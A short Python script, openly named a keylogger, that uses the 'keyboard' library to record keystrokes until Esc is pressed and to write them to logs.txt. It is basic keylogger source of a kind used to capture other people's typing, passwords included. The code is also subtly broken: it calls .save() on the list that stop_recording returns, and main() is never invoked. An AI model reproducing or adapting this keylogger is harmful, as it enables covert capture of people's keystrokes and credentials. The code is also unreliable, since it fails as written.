import keyboard

def keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.start_recording()
    keyboard.wait('esc')
    keyboard.stop_recording().save("logs.txt")
    print("Keylogger stopped. Keys saved to logs.txt.")

def main():
    keylogger()